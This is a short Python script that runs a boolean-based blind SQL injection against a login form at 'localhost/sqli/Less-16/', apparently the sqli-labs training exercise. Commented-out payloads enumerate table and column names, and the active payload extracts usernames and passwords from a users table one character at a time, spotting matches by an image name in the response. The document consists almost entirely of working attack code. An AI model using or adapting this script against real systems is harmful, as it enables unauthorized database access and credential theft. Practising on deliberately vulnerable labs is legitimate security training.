#coding:utf-8
import requests

namelen = 1024
char = "abcdefghijklmnopqrstuvwxyz0123456789~*\/{}?!:@,_-"

def getPostData(loca,str):
    #爆出表名
    #postData = "admin\") and mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),%s,1)='%s' -- "%(loca,str)
    #爆出字段名
    #postData = "admin\") and mid((select group_concat(column_name) from information_schema.columns where table_name = 'users'),%s,1)='%s' -- "%(loca,str)
    #爆出字段值
    postData = "admin\") and mid((select group_concat(username,0x3a,password) from users),%s,1)='%s' -- "%(loca,str)
    postData = {"uname":postData, "passwd":"123"}
    return postData

url = "http://localhost/sqli/Less-16/"
name = ""
for i in range(1, namelen):
    flag = True
    for str in char:
	postData = getPostData(i,str)
	res = requests.post(url, data = postData)
	if "flag.jpg" in res.content:
	    name += str
	    print(name)
	    flag = False
	    break
    if(flag):break
print("result: "+name)




